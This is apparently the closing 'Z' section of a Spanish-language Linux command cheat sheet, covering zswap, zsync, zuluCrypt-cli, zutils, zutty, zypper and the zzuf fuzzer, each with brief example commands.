Módulo del kernel con la función principal de evitar la paginación en disco incrementando el rendimiento del sistema. Para activar este módulo se precisa una partición Swap y que la versión de kernel sea como mínimo la 3.11.
# nano /etc/default/grub
Y añadir la opción "zswap.enabled" en la linea:
GRUB_CMDLINE_LINUX_DEFAULT="quiet zswap.enabled=1"
Actualizar grup:
# update-grub
Una vez reiniciado comprobar su funcionamiento con:
$ dmesg | grep zswap


zsync
Descargar partes nuevas de un archivo del que ya se tiene una copia anterior en el pc.
$ zsync http://cdimage.ubuntu.com/daily-live/current/raring-desktop-amd64.iso.zsync


zulucrypt-cli
Herramienta para crear y administrar volúmenes cifrados con luks, Plain, truecrypt y veracrypt.
$ zuluCrypt-cli -c -d /dev/sda1 -z ext4 -t luks -p contraseña (crear un volumen encriptado de la partición especificada, tipo ext4, tipo de volumen y contraseña existente)
$ zuluCrypt-cli -o -d /dev/sda1 -m sda1 -e ro -p contraseña (abrir volumen, componente que se agregará al prefijo del punto de montaje, solo lectura y contraseña existente)
$ zuluCrypt-cli -q -d /dev/sda1 (cerrar volumen)
$ zuluCrypt-cli -r -d /dev/sda1 -p contraseña (suprimir contraseña de un volument)
$ zuluCrypt-cli -a -d /dev/sda1 -y contraseña -l nueva (añadir contraseña a la existente en un volumen luks)


zutils
Conjunto de herramientas capaces de procesar cualquier combinación de ficheros comprimidos y sin comprimir. Los ficheros comprimidos se descomprimen sobre la marcha; no se crean ficheros temporales. Actualmente, los compresores compatibles son gzip, bzip2, lzip, xz y zstd. Incluye las aplicaciones zcat [Descomprime y copia ficheros], zcmp [Descomprime y compara dos ficheros byte a byte], zdiff [Descomprime y compara dos ficheros línea a línea], zgrep [Descomprime y busca en ficheros una expresión regular], ztest [Comprueba la integridad de ficheros comprimidos] y zupdate [Recomprime ficheros al formato lzip].


zutty
Emulador de terminal con baja latencia similar a varios otros emuladores como xterm, rxvt...
$ zutty -title linux -cr #e10e0e -bg #605353 -fg #f36d6d -geometry 120x40 bash (con titulo, cursor de un color, fondo y fuentes de otros con una geometria concreta y usando bash)


zypper
Gestor de paquetes de opensuse [rpm]
# zypper (Generar una lista de paquetes instalados)
# zypper repos (Listar repositorios)
# zypper install paquete  (Instalar paquete)
# zypper install rutadelpaquete (Instalar paquetes que no está en los repositorios)
# zypper install --force paquete (Reinstalar)
# zypper remove paquete (Desinstalar paquete)
# zypper remove --clean-deps paquete (Desinstalar con dependencias)
# zypper search paquete (Buscar paquete)
# zypper help comando (ayuda para un comando)
# zypper update (Actualizar base de datos y el sistema)
# zypper info paquete (Buscar información de paquete)
# zypper clean (Limpiar caché e información obsoleta)
# zypper refresh (Actualizar información)
# zypper dist-upgrade (Actualizar distro)
# zypper al 'paquete' (Descartar paquete para actualizaciones)
# zypper rl 'paquete' (Desbloquear paquete del bloqueo anterior)
# zypper verify (Verificar dependencias)
# zypper intall-new-recommends (Instalar paquetes recomendados)
# zypper list-updates (Listar Actualizaciones disponibles)
# zypper list-patches (Listar parches disponibles)
# zypper patches (Instalar parches disponibles)
# zypper addrepo rutadelrepositorio (Añadir repositorio)
# zypper addrepo -f repositorio rutadelrepositorio (Añadir con actualización automática)
# zypper modifyrepo --disable repositorio (Desactivar repositorio)
# zypper removerepo nombredelrepositorio (Suprimir repositorio)


zzuf
Altera de forma aleatoria el contenido de un archivo.
$ zzuf -b10- -r0.6 cat datos.txt (a partir del 10 byte y modificando el 60% del contenido del archivo datos.txt)
